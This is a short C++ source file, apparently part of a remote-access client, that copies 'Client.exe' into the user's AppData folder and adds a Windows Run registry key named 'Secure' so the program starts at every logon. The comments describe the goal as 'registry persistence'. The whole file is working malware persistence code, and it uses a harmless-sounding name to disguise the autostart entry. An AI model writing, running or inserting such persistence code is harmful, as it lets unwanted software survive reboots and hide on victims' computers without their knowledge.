#include <iostream>
#include <fstream>
using namespace std;

int main() {
	system("cmd /c copy .\\Client.exe %appdata%");  
	// copy executable to appdata
	system("cmd /c REG ADD HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /V \"Secure\" /t REG_SZ /F /D \"%appdata%\\Client.exe"); 
	//add registry persistence
}